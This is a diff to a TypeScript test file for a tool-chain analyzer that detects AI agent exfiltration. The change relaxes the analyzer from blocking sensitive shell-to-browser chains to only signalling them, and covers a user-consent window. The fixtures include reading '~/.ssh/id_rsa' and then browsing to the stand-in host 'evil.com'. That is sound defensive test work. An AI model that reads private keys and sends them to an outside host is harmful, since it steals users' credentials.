@@ -47,23 +47,23 @@ afterEach(() => {
   try { rmSync(tempHome, { recursive: true, force: true }); } catch { /* best-effort */ }
 });
 
-describe("ToolChainAnalyzer — exfil block default", () => {
-  it("blocks sensitive shell → browser when no consent", () => {
+describe("ToolChainAnalyzer — exfil staging default", () => {
+  it("signals (not blocks) sensitive shell → browser when no consent; no secret on the wire", () => {
     analyzer.recordAndAnalyze("bash", { command: "python -c 'import pypdf; ...'" }, SENSITIVE_PDF_CONTENT);
     const result = analyzer.recordAndAnalyze("browser", { url: "https://cloud.thrivemetrics.com" }, NEUTRAL);
-    expect(result.blocked).toBe(true);
-    expect(result.reason).toMatch(/Exfiltration pattern/);
+    expect(result.blocked).toBe(false);
+    expect(result.staging).toBeDefined();
   });
 });
 
 describe("ToolChainAnalyzer — user consent bypass", () => {
-  it("allows the same chain when consent is active", () => {
+  it("suppresses even the staging signal when consent is active", () => {
     analyzer.markUserConsent(30 * 60_000, "chat-attachment-with-directive");
     analyzer.recordAndAnalyze("bash", { command: "python -c 'import pypdf; ...'" }, SENSITIVE_PDF_CONTENT);
     const result = analyzer.recordAndAnalyze("browser", { url: "https://cloud.thrivemetrics.com" }, NEUTRAL);
     expect(result.blocked).toBe(false);
     expect(result.allowedByConsent).toBe("chat-attachment-with-directive");
-    expect(result.exfil).toBeDefined(); // pattern still detected, just not blocked
+    expect(result.staging).toBeDefined(); // pattern still detected, just not scored
   });
 
   it("isUserConsentActive returns false outside window", () => {
@@ -76,12 +76,14 @@ describe("ToolChainAnalyzer — user consent bypass", () => {
     }, 10));
   });
 
-  it("blocks again after consent window expires", () => {
+  it("signals staging again (un-suppressed) after consent window expires", () => {
     analyzer.markUserConsent(1, "test"); // 1ms window
     return new Promise<void>((resolve) => setTimeout(() => {
       analyzer.recordAndAnalyze("bash", { command: "cat ~/.ssh/id_rsa" }, SENSITIVE_PDF_CONTENT);
       const result = analyzer.recordAndAnalyze("browser", { url: "https://evil.com" }, NEUTRAL);
-      expect(result.blocked).toBe(true);
+      expect(result.blocked).toBe(false);
+      expect(result.staging).toBeDefined();
+      expect(result.allowedByConsent).toBeUndefined();
       resolve();
     }, 10));
   });
